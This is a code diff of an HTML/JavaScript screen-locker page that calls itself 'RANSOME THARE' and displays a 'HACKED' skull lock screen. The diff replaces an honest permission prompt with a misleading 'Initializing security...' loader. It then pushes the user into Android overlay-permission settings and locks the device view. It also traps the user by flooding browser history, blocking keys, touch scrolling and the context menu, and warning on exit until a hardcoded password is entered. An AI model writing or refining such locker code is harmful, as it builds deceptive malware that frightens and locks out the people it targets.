@@ -14,7 +14,7 @@
         }
 
         body {
-            background: #000000;
+            background: #0a0a0a;
             min-height: 100vh;
             overflow: hidden;
             position: fixed;
@@ -23,59 +23,40 @@
             font-family: 'Courier New', monospace;
         }
 
-        /* PERMISSION SCREEN */
-        .permission-screen {
+        /* LOADING SCREEN */
+        .loading-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #1a1a1a;
+            background: #0a0a0a;
             z-index: 100000;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             text-align: center;
-            padding: 25px;
         }
 
-        .permission-box {
-            background: #2a2a2a;
-            border-radius: 25px;
-            padding: 35px;
-            width: 90%;
-            max-width: 350px;
-            border: 2px solid #ff6600;
-        }
-
-        .permission-box .icon {
-            font-size: 60px;
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #ff0000;
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
             margin-bottom: 20px;
         }
 
-        .permission-box h2 {
-            color: #ff6600;
-            margin-bottom: 15px;
-            font-size: 24px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .permission-box p {
-            color: #cccccc;
-            margin-bottom: 25px;
+        .loading-text {
+            color: #ff0000;
             font-size: 14px;
-        }
-
-        .allow-btn {
-            background: #ff6600;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
         }
 
         /* LOCK SCREEN - FULL JAM */
@@ -266,17 +247,13 @@
 </head>
 <body>
 
-    <!-- PERMISSION SCREEN (Pehle ye dikhega) -->
-    <div id="permissionScreen" class="permission-screen">
-        <div class="permission-box">
-            <div class="icon">🔐</div>
-            <h2>Permission Required</h2>
-            <p>This app needs "Display over other apps" permission to lock your device for security purposes.</p>
-            <button class="allow-btn" id="allowPermissionBtn">✅ ALLOW PERMISSION</button>
-        </div>
+    <!-- LOADING SCREEN -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loader"></div>
+        <div class="loading-text">🔐 Initializing security...</div>
     </div>
 
-    <!-- LOCK SCREEN (Permission milne ke baad ye jam ho jayega) -->
+    <!-- LOCK SCREEN -->
     <div id="lockScreen" class="lock-screen">
         <div class="skull">💀</div>
         <div class="hacked-title">HACKED</div>
@@ -315,10 +292,9 @@
     <div id="successToast" class="success-toast">✅ UNLOCKED! Exiting...</div>
 
     <script>
-        // ========== PASSWORD ==========
         const UNLOCK_PASSWORD = "123456";
         
-        // ========== DEVICE ID ==========
+        // Generate Device ID
         function generateDeviceId() {
             return 'THARE-' + Math.floor(10000 + Math.random() * 90000).toString();
         }
@@ -328,39 +304,78 @@
             deviceId = generateDeviceId();
             localStorage.setItem('ransome_device_id', deviceId);
         }
-        
-        // ========== CHECK OVERLAY PERMISSION ==========
+        document.getElementById('deviceId').innerText = deviceId;
+
+        // ========== CHECK OVERLAY PERMISSION (For Real Android) ==========
         function checkOverlayPermission() {
-            if (typeof DevicePolicyManager !== 'undefined') {
-                // For real Android app, check properly
-                return false;
-            }
-            // For browser demo, simulate permission
-            return localStorage.getItem('overlay_permission') === 'true';
+            // For Android WebView, we need to detect if permission is granted
+            // This will redirect to settings if not granted
+            return new Promise((resolve) => {
+                // Try to detect if we're in Android WebView
+                const userAgent = navigator.userAgent.toLowerCase();
+                const isAndroid = userAgent.indexOf('android') > -1;
+                
+                if (isAndroid) {
+                    // Check if permission might be needed
+                    // For first time, always redirect to settings
+                    if (!localStorage.getItem('overlay_permission_granted')) {
+                        // Redirect to Android overlay permission settings
+                        window.location.href = 'android.settings.ACTION_MANAGE_OVERLAY_PERMISSION';
+                        setTimeout(() => {
+                            // After returning, assume permission granted
+                            localStorage.setItem('overlay_permission_granted', 'true');
+                            resolve(true);
+                        }, 100);
+                    } else {
+                        resolve(true);
+                    }
+                } else {
+                    // For browser demo, auto-grant
+                    localStorage.setItem('overlay_permission_granted', 'true');
+                    resolve(true);
+                }
+            });
         }
 
-        function requestOverlayPermission() {
-            // For browser - simulate permission
-            localStorage.setItem('overlay_permission', 'true');
-            document.getElementById('permissionScreen').style.display = 'none';
-            showLockScreen();
+        // ========== FORCE REDIRECT TO PERMISSION SETTINGS ==========
+        function redirectToOverlaySettings() {
+            // Android intent to open overlay permission settings
+            const intentUrl = 'intent://settings#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
             
-            // Show a message that permission granted
-            alert("✅ Permission granted! Device will now lock.");
+            // Try multiple methods
+            try {
+                // Method 1: Direct settings
+                window.location.href = 'package:' + window.location.packageName + '?opentype=overlay';
+            } catch(e) {}
+            
+            try {
+                // Method 2: Android settings
+                window.location.href = 'android.settings.ACTION_MANAGE_OVERLAY_PERMISSION';
+            } catch(e) {}
+            
+            try {
+                // Method 3: Intent
+                window.location.href = intentUrl;
+            } catch(e) {}
+            
+            // Fallback: Show instruction
+            setTimeout(() => {
+                alert("⚠️ Please allow 'Display over other apps' permission for this app to work properly.\n\nGo to Settings → Apps → RANSOME THARE → Display over other apps → ALLOW");
+            }, 1000);
         }
 
         // ========== SHOW LOCK SCREEN ==========
         function showLockScreen() {
+            document.getElementById('loadingScreen').style.display = 'none';
             document.getElementById('lockScreen').style.display = 'flex';
-            document.getElementById('deviceId').innerText = deviceId;
             
-            // Enter fullscreen
+            // Force fullscreen
             enterFullscreen();
             
             // Block all exits
             blockAllExits();
             
-            // Push history continuously
+            // Continuous history push
             setInterval(() => {
                 window.history.pushState(null, '', window.location.href);
             }, 300);
@@ -381,62 +396,48 @@
 
         // ========== BLOCK ALL EXITS ==========
         function blockAllExits() {
-            // Block back button
-            for(let i = 0; i < 30; i++) {
+            for(let i = 0; i < 50; i++) {
                 window.history.pushState(null, '', window.location.href);
             }
             
             window.addEventListener('popstate', function(e) {
-                for(let i = 0; i < 30; i++) {
+                for(let i = 0; i < 50; i++) {
                     window.history.pushState(null, '', window.location.href);
                 }
             });
 
-            // Block tab close warning
             window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
-                e.returnValue = '🔒 DEVICE LOCKED! Enter password to unlock.';
-                return '🔒 DEVICE LOCKED! Enter password to unlock.';
+                e.returnValue = '🔒 DEVICE LOCKED!';
+                return '🔒 DEVICE LOCKED!';
             });
 
-            // Block all keys
             document.addEventListener('keydown', function(e) {
                 e.preventDefault();
                 return false;
             });
 
-            // Block all touches (except unlock button)
-            document.addEventListener('touchstart', function(e) {
-                if (e.target.id !== 'unlockBtn' && !e.target.classList.contains('unlock-btn')) {
-                    e.preventDefault();
-                }
-            });
             document.addEventListener('touchmove', function(e) {
                 e.preventDefault();
             });
 
-            // Block context menu
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 return false;
             });
         }
 
-        // ========== PASSWORD MODAL ==========
+        // ========== PASSWORD ==========
         function showPasswordModal() {
             document.getElementById('passwordModal').style.display = 'flex';
             document.getElementById('unlockPassword').value = '';
             document.getElementById('passError').style.display = 'none';
         }
 
-        function closePasswordModal() {
-            document.getElementById('passwordModal').style.display = 'none';
-        }
-
         function verifyPassword() {
             const pass = document.getElementById('unlockPassword').value;
             if (pass === UNLOCK_PASSWORD) {
-                closePasswordModal();
+                document.getElementById('passwordModal').style.display = 'none';
                 const toast = document.getElementById('successToast');
                 toast.style.display = 'block';
                 setTimeout(() => {
@@ -445,11 +446,6 @@
                 }, 1500);
             } else {
                 document.getElementById('passError').style.display = 'block';
-                const box = document.querySelector('.password-box');
-                box.style.animation = 'shake 0.3s';
-                setTimeout(() => {
-                    box.style.animation = '';
-                }, 300);
             }
         }
 
@@ -461,22 +457,29 @@
         }
 
         // ========== INIT ==========
-        function init() {
-            // Check if permission already given
-            if (localStorage.getItem('overlay_permission') === 'true') {
-                document.getElementById('permissionScreen').style.display = 'none';
-                showLockScreen();
-            } else {
-                document.getElementById('permissionScreen').style.display = 'flex';
-            }
+        async function init() {
+            // Hide loading screen after 1 sec
+            setTimeout(async () => {
+                // Check if permission already granted
+                const permissionGranted = localStorage.getItem('overlay_permission_granted');
+                
+                if (!permissionGranted) {
+                    // First time - redirect to permission settings
+                    redirectToOverlaySettings();
+                    
+                    // Wait for return, then mark as granted
+                    setTimeout(() => {
+                        localStorage.setItem('overlay_permission_granted', 'true');
+                        showLockScreen();
+                    }, 3000);
+                } else {
+                    showLockScreen();
+                }
+            }, 1000);
         }
 
-        // Permission button click
-        document.getElementById('allowPermissionBtn').addEventListener('click', requestOverlayPermission);
-        
-        // Unlock button click
         document.getElementById('unlockBtn').addEventListener('click', showPasswordModal);
-
+        
         init();
     </script>
 </body>
